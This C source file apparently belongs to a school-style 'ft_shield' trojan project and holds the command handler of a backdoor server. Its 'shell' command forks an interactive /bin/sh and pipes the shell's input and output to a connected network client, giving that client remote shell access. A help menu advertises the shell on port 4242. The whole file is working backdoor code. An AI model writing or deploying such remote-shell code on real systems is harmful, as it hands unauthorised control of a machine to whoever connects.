#include "ft_shield.h"

void shell(t_server *server, int fd, char *msg) {
	if (strcmp(msg, "?") == 0) {
		if(send(fd, "? show help\nshell Spawn remote shell on 4242\n$> ", strlen("? show help\nshell Spawn remote shell on 4242\n$> "), 0) < 0) {
			remove_client(server, fd);
			fprintf(stderr, "Failed to send the response to the client\n");
		}
	}
	else if (strcmp(msg, "shell") == 0) {
		if (send(fd, "Spawning shell on port 4242\n", strlen("Spawning shell on port 4242\n"), 0) < 0) {
			remove_client(server, fd);
			fprintf(stderr, "Failed to send the response to the client\n");
		}
		t_client *client = NULL;
		for (int i = 0; i < 3; i++) {
			if (server->clients[i].fd == fd) {
				client = &server->clients[i];
				break;
			}
		}
		if (client == NULL) {
			return;
		}
		int input[2];
		pipe(input);
		client->output_pid = fork();
		if (client->output_pid < 0) {
			remove_client(server, fd);
			fprintf(stderr, "Failed to fork\n");
		}
		else if (client->output_pid == 0) {
			int output[2];
			pipe(output);

			client->shell_pid = fork();
			if (client->shell_pid < 0) {
				remove_client(server, fd);
				fprintf(stderr, "Failed to fork\n");
			}
			else if (client->shell_pid == 0) {
				close(input[1]);
				close(output[0]);
				dup2(input[0], 0);
				dup2(output[1], 1);
				dup2(output[1], 2);
				char *envp[] = {
					"TERM=xterm-256color",
					NULL
				};
				execle("/bin/sh", "sh", "-i", "+m", NULL, envp);
				exit(0);
			}
			close(input[0]);
			close(input[1]);
			close(output[1]);

			int bytes_read;
			char buf[4096];
			while ((bytes_read = read(output[0], buf, 4096)) > 0) {
				if (send(client->fd, buf, bytes_read, 0) < 0) {
					remove_client(server, fd);
					fprintf(stderr, "Failed to send the response to the client\n");
					break;
				}
			}
			kill(client->shell_pid, SIGKILL);
			waitpid(client->shell_pid, NULL, 0);
			if(send(client->fd, "$> ", strlen("$> "), 0) < 0) {
				fprintf(stderr, "Failed to send the response to the client\n");
				remove_client(server, fd);
			}
			exit(0);
		}
		client->shell_fd = input[1];
		close(input[0]);
	}
	else if (strcmp(msg, "") == 0) {
		if(send(fd, "$> ", strlen("$> "), 0) < 0) {
			remove_client(server, fd);
			fprintf(stderr, "Failed to send the response to the client\n");
		}
	}
	else {
		if(send(fd, "Unknown command!\n$> ", strlen("Unknown command!\n$> "), 0) < 0) {
			remove_client(server, fd);
			fprintf(stderr, "Failed to send the response to the client\n");
		}
	}
}